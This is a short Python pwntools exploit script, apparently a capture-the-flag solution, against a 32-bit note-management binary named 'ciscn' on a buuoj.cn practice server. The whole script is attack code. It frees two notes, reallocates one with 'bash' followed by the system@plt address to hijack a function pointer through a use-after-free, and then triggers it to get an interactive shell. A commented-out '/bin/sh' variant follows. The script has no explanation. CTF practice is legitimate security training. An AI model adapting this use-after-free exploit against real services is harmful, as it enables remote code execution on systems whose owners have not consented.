from pwn import *

# p = process('./ciscn')
p = remote('node4.buuoj.cn', 29728)
elf = ELF('./ciscn')
lib = ELF('/home/hututu/tools/glibc-all-in-one/libs/2.27-3ubuntu1_i386/libc-2.27.so')


def add_text(id_, size_, mess):
    p.recvuntil(b'CNote >')
    p.sendline(b'1')
    p.recvuntil(b'Index >')
    p.sendline(id_)
    p.recvuntil(b'Type >')
    p.sendline(b'2')
    p.recvuntil(b'Length >')
    p.sendline(size_)
    p.recvuntil(b'Value >')
    p.sendline(mess)


def add_int(id_, mess):
    p.recvuntil(b'CNote >')
    p.sendline(b'1')
    p.recvuntil(b'Index >')
    p.sendline(id_)
    p.recvuntil(b'Type >')
    p.sendline(b'1')
    p.recvuntil(b'Value >')
    p.sendline(mess)


def delete(id_):
    p.recvuntil(b'CNote >')
    p.sendline(b'2')
    p.recvuntil(b'Index >')
    p.sendline(id_)


def show(id_):
    p.recvuntil(b'CNote >')
    p.sendline(b'3')
    p.recvuntil(b'Index >')
    p.sendline(id_)


system_addr = elf.plt['system']
add_text(b'1', b'12', b'a')
add_int(b'2', b'111')
delete(b'1')
delete(b'2')
payload = b'bash' + p32(system_addr)
add_text(b'3', b'12', payload)
# add_text(b'1', b'12', b'a')
# add_int(b'2', b'111')
# add_int(b'4', b'111')
# add_text(b'5', b'12', b'a')
# delete(b'1')
# delete(b'2')
# payload = p32(0x80486de) + p32(system_addr)
# add_text(b'3', b'12', payload)
# delete(b'4')
# payload = b'/bin/sh\00'
# add_text(b'6', b'12', payload)
# gdb.attach(p)
delete(b'1')
p.interactive()
